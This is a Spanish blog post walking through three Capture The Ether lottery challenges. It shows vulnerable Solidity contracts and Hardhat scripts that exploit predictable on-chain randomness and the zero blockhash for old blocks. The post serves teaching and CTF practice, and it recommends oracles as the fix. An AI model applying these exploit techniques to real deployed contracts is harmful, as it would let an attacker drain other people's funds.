---
layout: post
title: "Capture The Ether - Parte 2"
date: 2022-07-31
excerpt: "Capítulo 2 de la serie de desafíos en CTE"
tag: [cte, challenge, resolución]
comments: true
---

<img src="/imagenes/03-Titulo.png">
<br>
<div style="text-align:center;">
<p>En este segundo capítulo intentaré explicar los desafíos:</p>

<span><b>1. </b>Guess the new number</span>
<br>
<span><b>2. </b>Predict the future</span>
<br>
<span><b>3. </b>Predict the block hash</span>
<h1 style="color:#089990; margin-bottom: 0px;">1. Guess the new number</h1>
<h2 style="margin-bottom: 0px; margin-top: 0px">Problema:</h2>
<b><i>"El número ahora se genera bajo demanda cuando se intenta adivinarlo."</i></b>
<br>
<br>
<p>El contrato que atacaremos será el siguiente</p>
</div>

{% highlight typescript %}

pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

{% endhighlight %}

### Datos de lectura:
<button class="btn btn-info" id="botonRevelarLectura1" onclick="revelarSeccion(document.getElementById('lectura1'), 'botonRevelarLectura1')">Revelar</button>
<div id="lectura1" style="display:none">
  <ul>
    <li><i>Answer</i> se genera bajo demanda, por lo que no podemos intentar lo mismo que en <b><i>Guess the random number</i></b>.</li>
    <li>Sabemos la lógica dentro de la función <i>guess</i> que genera el valor de <i>answer</i>.</li>
  </ul>
</div>

### Ideas para soluciones:

<button class="btn btn-success" id="botonRevelarIdeasSoluciones1" onclick="revelarSeccion(document.getElementById('ideasSoluciones1'), 'botonRevelarIdeasSoluciones1')">Revelar</button>
<div id="ideasSoluciones1" style="display:none">
  <ul>
    <li>La lógica para generar el valor de <i>answer</i> ¿Podría ser utilizada antes de invocar a la función <i>guess</i> del contrato <i>GuessTheNewNumberChallenge</i>?</li>
  </ul>
</div>

### Explicación:
<button class="btn btn-warning" id="botonRevelarExplicacion1" onclick="revelarSeccion(document.getElementById('explicacion1'), 'botonRevelarExplicacion1')">Revelar</button>
<div id="explicacion1" style="display: none">
  Bien, desarrollemos un poco más esto de "utilizar antes la lógica que genera un <i>answer</i>" viendo cómo está compuesta la misma. En <b><i>Guess the random number</i></b> vimos qué era <i>keccak256</i>, eso ya lo sabemos. Pero ¿<i>block.blockhash</i>, <i>block.number</i>, y <i>now</i>?
  <br>
  <ol>
    <li>
      <b><i>Now:</i></b> Es el viejo y confiable timestamp. Pero viejo y confiable es un decir, ya veremos por qué.
    </li>
    <li>
      <b><i>Block.blockhash:</i></b> Es el hash de un bloque dentro de la blockchain. Si se intenta obtener un hash de un bloque posterior al actual, o ubicado más de 256 posiciones detrás, este parámetro valdrá cero.
    </li>
    <li>
      <b><i>Block.number:</i></b> Indica el número de un bloque en la blockchain.
    </li>
  </ol>
  ¿Y ahora? Bueno, algo que se nos puede ocurrir es que si el <i>blockhash</i> y <i>number</i> son datos que se pueden obtener directo de la blockchain, podríamos ver qué valor tienen en un momento específico, ir corriendo y a la velocidad de la luz probar con esos valores y darnos cuenta que... no va a funcionar 😩.
  <br>
  <br>
  ¿Por qué? La realidad es que nuestro escenario no es como lo que solemos conocer de internet. Aquí, la invocación a una función que modificará el estado de la blockchain (a.k.a Transacción --> GuessTheNewNumber nos dará 2 ether tras adivinar su <i>answer</i>) no será instantánea, ya que es necesario que la misma ingrese en la mempool, que un minero (o validador en PoS) la tome, la EVM ejecute opcodes y muchas cosas raras más. ¿Que de qué estoy hablando?
  <br>
  <br>
  Nada, vos simplemente recordá que <b>Transacción --> NO es instantánea</b>, y en ese tiempo que tarda en hacer todo lo de arriba, los datos que tomamos ya podrían haber cambiado su valor (otro bloque con otro hash, otro number, etc). (PD: Tranquile, aprenderemos todo eso raro de arriba a su debido momento).
  <br>
  
  <br>
  <img src="/imagenes/y-ahora-que-nemo.gif">
  <br>

  Ahora, es momento de nuestra primera jugada sucia: crear un contrato que ataque a GuessTheNewNumberChallenge. ¿Un contrato para atacar a otro contrato? <a href="https://www.youtube.com/watch?v=6jJkdRaa04g">Oh yeah</a>.
  <br>
  <br>

  La idea es que dentro de la blockchain, tengamos un contrato que pueda generar el mismo <i>answer</i> que <i>GuessTheNewNumber</i>, y realizar un <i>guess</i> con este valor. Con esto nos aseguramos que el cálculo se hará con las variables apropiadas y que no cambiarán repentinamente.
  <br>
  <br>
  Puede que a esta altura ya te hayas dado cuenta de cómo será la solución, pero yo no tuve esa suerte. Tuve un problema con el <i>viejo y conocido timestamp (a.k.a "now")</i>.
  <br>
  <br>
  Mi duda podemos verla mejor en esta obra de arte creada en paint.
  <br>
  <br>
  <img src="/imagenes/03-Timestamp.png">
  <br>
  <br>
  Si pudiste responder la pregunta que figura en la obra de arte ¡Enhorabuena! <a href="https://youtu.be/IGrvPFCQ6K8?t=131">10 puntos para Gryffindor</a>. Sin embargo, para les que somos Hufflepuff, capaz nos quedó la duda. Y la respuesta la encontramos en el yellow paper de Ethereum:
  <br>
  <br>
  <img src="/imagenes/03-Timestamp yellow paper.png">
  <br>
  <br>
  Básicamente lo que nos muestra este recorte son las propiedades que contiene el header de un bloque, y entre ellas figura el timestamp, que <b>NO ES UN TIMESTAMP QUE CAMBIA TRANSACCIÓN A TRANSACCIÓN</b>, este timestamp es el de <b>CONCEPCIÓN DEL BLOQUE</b>.
  <br>
  <br>
  Entonces, con los conocimientos sobre <i>keccak</i>, <i>block.blockhash</i>, <i>block.number</i>, <i>now</i> y la posibilidad de crear un <i>contrato</i> que nos ayude a atacar a GuessTheNewNumberChallenge, ¡Pasemos a la acción!
</div>

### Test a ejecutar:
<button class="btn btn-danger" id="botonRevelarTest1" onclick="revelarSeccion(document.getElementById('testAEjecutar1'), 'botonRevelarTest1')">Revelar</button>
<div id="testAEjecutar1" style="display:none">
  <br>
  <div style="text-align:center">
    <b>Contrato que usaremos para atacar a GuessTheNewNumberChallenge</b>
  </div>
  <br>
  <img src="/imagenes/03-Solucion-GuessTheNewNumber.png">
  <br>
  <br>

  <div style="text-align:center">
    <b>Test que ejecutaremos</b> 
    <br>
    <i>PD: Recordar cambiar las address según corresponda.</i>
  </div>
  <br>
  {% highlight typescript %}

  import { expect } from "chai";
  import { ethers } from "hardhat";
  import { Contract, BigNumber } from "ethers";

  let newNumberContract: Contract;
  let attackerNewNumberContract: Contract;

  beforeEach(async ()=>{
    const newNumberFactory = await ethers.getContractFactory("GuessTheNewNumberChallenge");
    newNumberContract = newNumberFactory.attach("0xDF44b94E500CC9cAba7BE9365794AF4320df0C7f");
    const attackerNewNumberFactory = await ethers.getContractFactory("TheNewNumberChallengeAttacker");
    attackerNewNumberContract = await attackerNewNumberFactory.deploy();
  })

  describe("Guess The New Number", async()=>{
    it("Resuelve el Lottery challenge - Guess The New Number", async()=>{
      const tx = await attackerNewNumberContract.atacarNewNumberChallenge(newNumberContract.address,{
        value: ethers.utils.parseEther("1"),
        gasLimit: 1e5
      });
      console.log(tx.hash)
      tx.wait();
      let isComplete:boolean = await newNumberContract.isComplete();
      if (isComplete) {
        console.log("DESAFÍO RESUELTO. Retirando ETH...");
      }

      expect(isComplete,"DESAFÍO INCOMPLETO").to.be.true;
    })
  })

  {% endhighlight %}
</div>

### Conclusión:
Confiar en variables que cambien según el estado de la blockchain no es algo que nos asegure la generación de un valor aleatorio. Para ello existen otras herramientas, como los <a href="https://docs.chain.link/docs/get-a-random-number/">Oráculos</a>, por ejemplo.
<br>
<br>

<hr>

<div style="text-align:center">
<h1 style="color:#089990; margin-bottom: 0px;">2. Predict the future</h1>
<h2 style="margin-bottom: 0px; margin-top: 0px">Problema:</h2>
<b><i>"Esta vez, debe bloquear su intento por adivinar antes de que se genere el número aleatorio. Para darte una oportunidad deportiva, solo hay diez respuestas posibles. Tenga en cuenta que, de hecho, es posible resolver este desafío sin perder ningún ether."</i></b>
<br>
<br>
<p>El contrato que atacaremos será el siguiente</p>
</div>

{% highlight typescript %}

pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

{% endhighlight %}

### Datos de lectura:
<button class="btn btn-info" id="botonRevelarLectura2" onclick="revelarSeccion(document.getElementById('lectura2'), 'botonRevelarLectura2')">Revelar</button>
<div id="lectura2" style="display:none">
  <ul>
    <li style="white-space:wrap;">
     Este contrato se parece mucho al del desafío previo, con la salvedad de <i>lockInGuess</i> y la operación módulo 10 (el % 10 turbio).
    </li>
    <li>
      El desarrollador sigue creyendo en la generación de un número random onchain. Creo que en parte es como yo, que creí en Papá Noel más de la cuenta (hasta los 13 🎅🎄).
    </li>
  </ul>
</div>

### Ideas para soluciones:

<button class="btn btn-success" id="botonRevelarIdeasSoluciones2" onclick="revelarSeccion(document.getElementById('ideasSoluciones2'), 'botonRevelarIdeasSoluciones2')">Revelar</button>
<div id="ideasSoluciones2" style="display:none">
  <ul>
    <li>
      Podemos usar un contrato para generar el mismo valor en <i>answer</i>.
    </li>
    <li>
      El problema ahora radica en realizar la llamada a <i>settle()</i> en <b>el momento justo</b>.
    </li>
  </ul>
</div>

### Explicación:
<button class="btn btn-warning" id="botonRevelarExplicacion2" onclick="revelarSeccion(document.getElementById('explicacion2'), 'botonRevelarExplicacion2')">Revelar</button>
<div id="explicacion2" style="display: none">
  <h4><i><u>El momento justo</u></i></h4>
  Agarrá tu smart watch, tu reloj de arena y cualquier otro reloj que tengas. ¿Los tenés? Bueno, ahora vamos a hacer un experimento en el que no los necesitarás para nada 😋
  <br>
  <br>
  Este desafío nos sirve para entender cómo funciona un <i>revert</i>, o en criollo, cuándo y cómo una transacción se revierte. 
  <br>
  <br>
  ¿Escuchaste hablar de "<i>La EVM</i>" o "<i>Ethereum Virtual Machine</i>"? Si no lo habías hecho, quiero que <a href="https://youtu.be/pXoCg_q1YEU?t=50">escribas "La EVM es lo más grande que hay" con esta lapicera</a>. Acá esa máquina es palabra santa mi queridísime amigue. Esta máquina virtual entre otras cosas, al comenzar a procesar una transacción se guarda un estado inicial, y en caso que la transacción falle, todo volverá a la normalidad con ese estado guardado previamente. Maravilloso, ¿No? Te dije, la EVM es un regalo de Papá Noel a nuestros queridísimos 73 años. Gracias donde sea que estén <a href="https://www.linkedin.com/in/gregcolvin/">Greg</a> y <a href="https://gavwood.com/">Gavin</a> Noel.
  <br>
  <br>
  Lo que sigue simplemente es invocar a la función <i>settle()</i> y en caso de pifiarla, revertir la transacción para intentar nuevamente. Así sucesivamente hasta dar con el tan esperado <i>momento justo</i>. Esto lo logramos utilizando la función de Solidity llamada <b><i>require()</i></b>, tal y como veremos a continuación.
</div>

### Test a ejecutar:
<button class="btn btn-danger" id="botonRevelarTest2" onclick="revelarSeccion(document.getElementById('testAEjecutar2'), 'botonRevelarTest2')">Revelar</button>
<div id="testAEjecutar2" style="display:none">
<br>
  <div style="text-align:center">
    <b>Contrato que usaremos para atacar a PredictTheFuture </b>
  </div>
  <br>
  <img src="/imagenes/03-Solucion-PredictTheFuture.png">
  <br>
  <br>

  <div style="text-align:center">
    <b>Test que ejecutaremos</b> 
    <br>
    <i>PD: Recordar cambiar las address según corresponda.</i>
  </div>
  <br>

  {% highlight typescript %}
    import { expect } from "chai";
    import { ethers } from "hardhat";
    import { Contract } from "ethers";
    import { calmarLaManija } from "../../ayudines/calmarLaManija";

    let predictContract: Contract;
    let attackContract: Contract;

    beforeEach(async() =>{
      const predictFactory = await ethers.getContractFactory("PredictTheFutureChallenge");
      // predictContract = await predictFactory.deploy();
      predictContract = await predictFactory.attach("0x4aD565be896BedF3b6BdCB5752B12CB9A5fFA383");
      const attackFactory = await ethers.getContractFactory("PredictTheFutureAttacker");
      attackContract = await attackFactory.deploy(predictContract.address);
    })

    describe("Predict The Future",async ()=>{
      it("Resuelve el Lottery challenge - Predict The Future",async()=>{
        await attackContract.lockInGuess(2,{
                value: ethers.utils.parseEther("1"),
                gasLimit: 1e5
        });

        while (!await predictContract.isComplete()) {
          try {
            const transaction = await attackContract.attack({gasLimit:1e5});
            console.log("----------------------------------------------------------------");
            console.log(transaction.hash);
          } catch (err:any) {
            console.log(`ATAQUE REALIZADO SIN ÉXITO. ${err.message}`);
          }
          await calmarLaManija(1e4); //Espero, porque si no va a iterar una banda de tiempo mostrando 99999 consologueos. Además puede haber mal funcionamiento porque el valor cambie a mitad de la ejecución.
        }
        const isComplete = await predictContract.isComplete();    
        expect(isComplete, "DESAFÍO INCOMPLETO").to.be.true;
      })
    })

  {% endhighlight %}
  <br>
  <br>
  <b><i>ACLARACIONES</i></b>:
  <ul>
    <li>
      No es necesario lockear un número en particular, ya que realizaremos n intentos hasta dar con nuestro objetivo. Simplemente elegí un número entre 0 y 9 (por lo del operador módulo 10).
    </li>
    <li>
      La función calmarLaManija es una pavadita para esperar un poco. Te la dejo en este <a href="https://gist.github.com/bengalaq/1ea7e126eb8b994bc7b2c1c23b39f744">gist</a> para que nunca falte la calma en tu vida ❤️
    </li>
  </ul>
  
</div>

### Conclusión:
Para este ataque comprendimos cómo funciona un revert y lo explotamos para realizar n intentos. Sin embargo, vale resaltar que el principal problema del contrato víctima recae en la no utilización de un Oráculo, tal y como se lo mencionó en el desafío anterior.
<br>
<br>

<hr>

<div style="text-align:center">
<h1 style="color:#089990; margin-bottom: 0px;">3. Predict the block hash</h1>
<h2 style="margin-bottom: 0px; margin-top: 0px">Problema:</h2>
<b><i>"Adivinar un número de 8 bits es aparentemente demasiado fácil. Esta vez, debe predecir todo el blockhash de 256 bits para un futuro bloque."</i></b>
<br>
<br>
<p>El contrato que atacaremos será el siguiente</p>
</div>

{% highlight typescript %}

pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

{% endhighlight %}

### Datos de lectura:
<button class="btn btn-info" id="botonRevelarLectura3" onclick="revelarSeccion(document.getElementById('lectura3'), 'botonRevelarLectura3')">Revelar</button>
<div id="lectura3" style="display:none">
  <ul>
    <li style="white-space:nowrap;">
      Ahora el valor de <i>answer</i> solo se calcula mediante un blockhash.
    </li>
    <li style="white-space:wrap;">
      El tipo de variable de <i>answer</i> cambió de uint8 a bytes32. Deberemos tener esto en cuenta a la hora de lockear nuestro <i>guess</i>.
    </li>
  </ul>
</div>

### Ideas para soluciones:

<button class="btn btn-success" id="botonRevelarIdeasSoluciones3" onclick="revelarSeccion(document.getElementById('ideasSoluciones3'), 'botonRevelarIdeasSoluciones3')">Revelar</button>
<div id="ideasSoluciones3" style="display:none">
  <ul>
    <li>
      ¿No habíamos visto algo interesante del blockhash antes?
    </li>
  </ul>
</div>

### Explicación:
<button class="btn btn-warning" id="botonRevelarExplicacion3" onclick="revelarSeccion(document.getElementById('explicacion3'), 'botonRevelarExplicacion3')">Revelar</button>
<div id="explicacion3" style="display: none">
  <h4><i><u>Blockhash</u></i></h4>
  Por si no subiste a ver de qué estoy hablando, dicen que una imagen vale más que mil palabras:
  <br>
  <br>
  <img src="/imagenes/03-Blockhash.png">
  <br>
  <br>
  Este desafío vamos a poder resolverlo si al momento de tomar el blockhash, el bloque número <i>settlementBlockNumber</i> se encuentra a más de 256 bloques de distancia (al menos 257 bloques fueron minados luego de su concepción).
</div>

### Test a ejecutar:
<button class="btn btn-danger" id="botonRevelarTest3" onclick="revelarSeccion(document.getElementById('testAEjecutar3'), 'botonRevelarTest3')">Revelar</button>
<div id="testAEjecutar3" style="display:none">

  <div style="text-align:center">
    <b>Test que ejecutaremos</b> 
    <br>
    <i>PD: Recordar cambiar las address según corresponda.</i>
  </div>
  <br>

{% highlight typescript %}
import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract } from "ethers";
import { calmarLaManija } from "../../ayudines/calmarLaManija";

let blockhashContract: Contract;
const challengeAddress: string = "0x3a476198a3d3176a31a0d9746e9B16a830bb952B";

beforeEach(async () => {
  const blockhashFactory = await ethers.getContractFactory("PredictTheBlockHashChallenge");
  blockhashContract = await blockhashFactory.attach(challengeAddress);
})

describe("Predict The Blockhash", async () => {
  it("Resuelve el Lottery challenge - Predict the block hash", async () => {
    await blockhashContract.lockInGuess(ethers.constants.HashZero, {
      value: ethers.utils.parseEther("1"),
      gasLimit: 1e5
    });

    //Espero que se minen 256 bloques más para asegurar que cuando se haga block.blockhash(BloqueDelContratoVictima), la EVM devuelva un valor determinístico (cero).
    for (let i = 0; i < 257; i++) {
      await ethers.provider.send("evm_mine", []); // Usamos el método RPC para minar un bloque manualmente. También se puede "simular" el minado de bloques desde hardhat.config https://hardhat.org/hardhat-network/reference/#mining-modes
      console.log(await ethers.provider.getBlockNumber());
    }
    console.log("--------------SE HAN MINADO 256 BLOQUES!--------------");
    

    await blockhashContract.settle({ gasLimit: 1e5 });
    const isComplete = await blockhashContract.isComplete();
    expect(isComplete, "DESAFÍO INCOMPLETO").to.be.true;
  })
})

{% endhighlight %}
<br>
<b><i>ACLARACIONES</i></b>:
<ul>
    <li>
      Para resolver este desafío en la red de ropsten y obtener los puntos en CTE, se puede alterar este script para que se chequee constantemente el blockNumber de la red, y una vez que se hayan minado 256 bloques, ejecutar la llamada a "settle". Sin embargo, por timeouts del test o posibles complicaciones en la máquina que ejecute el script, es recomendable invocar el método lockInGuess con el hash 0x000... servirse un buen <a href="https://es.wikipedia.org/wiki/Fernet_con_coca">Ferneth</a> y volver después de un tiempo, donde ya seguramente se habrán minado 256 bloques, y llamar a la función "settle".
    </li>
  </ul>
</div>

### Conclusión:
A lo largo de estos 3 desafíos pudimos comprobar qué tan segura es la generación de números random onchain: 0. Acordate de los Oráculos, para estos escenarios pueden ser grandes amigos.
<br>
<br>
<hr>
<div style="text-align:center">
  Y hasta acá llegamos por hoy. Fue algo divertido, ¿no?
  <br>
  Con estos 3 desafíos finalizamos el bloque <b>Lottery</b>. ¡Felicitaciones! El próximo bloque se llama <b>Math</b>, y si bien muchas de las vulnerabilidades que veremos en él hoy en día ya fueron arregladas, existen algunos mecanismos interesantes que <b>SÍ</b> pueden ser aún aprovechados por un atacante.
  <br>
  Hasta la próxima, no te alteres.
  <br>
  <br>

  bengalaQ

</div>


<script>
function revelarSeccion(HTMLElement, nombreBoton) {

  if (document.getElementById(nombreBoton).innerHTML == "Ocultar") {
    document.getElementById(nombreBoton).innerHTML = "Revelar";
    HTMLElement.style.display = "none";
  } else {
    document.getElementById(nombreBoton).innerHTML = "Ocultar";
    HTMLElement.style.display = ""
  }
}
</script>